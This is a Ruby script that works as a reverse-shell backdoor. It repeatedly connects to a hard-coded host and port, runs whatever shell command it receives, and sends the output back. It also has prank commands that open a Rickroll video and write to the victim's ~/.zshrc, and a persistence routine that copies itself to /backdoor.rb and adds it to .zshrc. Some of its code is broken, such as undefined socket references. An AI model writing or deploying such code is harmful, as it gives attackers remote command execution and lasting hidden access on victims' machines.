require 'socket'
require 'open3'
require 'launchy'
require 'etc'

HOSTNAME = '192.168.1.219';
PORT = 3000;

USER = Etc.getlogin;

class Commands
	@@command_history = [];

	def rick(socket)
		Launchy.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
		socket.print("Rickrolled victim.");
		@@command_history.push("rick");
	end

	def roll()
		if File::exists?("/Users/#{USER}/.zshrc") != true
			File.new("/Users/#{USER}/.zshrc");
		end	
		
		File.open("/Users/#{USER}/.zshrc", "a") do |file| 
			file.write("ruby -e 'require %q[launchy];Launchy.open(%q[https://www.youtube.com/watch?v=dQw4w9WgXcQ])'");
			socket.print("added rickroll to .zshrc");
		end
	end

	def backdoor()
		if File::exists?("/Users/#{USER}/.zshrc") != true
			File.new("/Users/#{USER}/.zshrc");
		end	

		File.open("/Users/#{USER}/.zshrc", "a") do |file| 
			file.write("ruby /backdoor.rb");
			newfile = File.new("/backdoor.rb");
			contents = __FILE__.read
			newfile.write(contents)
		end

		socket.print("added backdoor to victim");
	end
end

def cli(cmd, socket, c)
	case cmd
		when "rick\n"
			c.rick(socket);

		when "roll\n"
			c.roll()			

		when "stay\n"
			c.backdoor()

		else
			Open3.popen2e(cmd) do |_stdin, stdout_err|
				socket.print(stdout_err.read);
			end
		end
end

loop do
	socket = TCPSocket.open(HOSTNAME, PORT);
	cmd = socket.gets;
	c = Commands.new();
	cli(cmd, socket, c);
	socket.close;
end
